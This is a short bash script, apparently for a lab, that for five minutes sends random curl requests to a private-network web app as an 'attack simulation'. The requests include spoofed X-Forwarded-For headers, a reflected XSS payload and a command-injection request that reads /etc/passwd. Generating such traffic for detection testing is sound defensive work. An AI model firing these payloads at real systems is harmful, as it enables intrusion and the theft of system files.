#!/bin/bash

# Total runtime = 5 minutes
END_TIME=$((SECONDS + 300))

# Define curl commands to randomly choose from
curl_1="curl -H 'X-Forwarded-For: 1.2.3.4' http://172.31.28.30:5000/client-ip"
curl_2="curl -H 'X-Forwarded-For: 45.227.253.55' http://172.31.28.30:5000/client-ip"
curl_3="curl 'http://172.31.28.30:5000/greet?name=%3Cscript%3Ealert(%22GotYou%20:%29%22)%3C/script%3E'"
curl_4="curl 'http://172.31.28.30:5000/cmd?exec=cat%20/etc/passwd'"

# Put them in an array
commands=("$curl_1" "$curl_2" "$curl_3" "$curl_4")

echo "[*] Starting random curl attack simulation for 5 minutes..."

while [ $SECONDS -lt $END_TIME ]; do
    # Pick a random index
    i=$(( RANDOM % ${#commands[@]} ))
    echo "[*] Executing: ${commands[$i]}"
    
    # Run the selected curl command
    eval "${commands[$i]}"
    echo "-----"

    # Sleep for 1-5 seconds randomly
    sleep $(( RANDOM % 5 + 1 ))
done

echo "[*] Simulation completed."
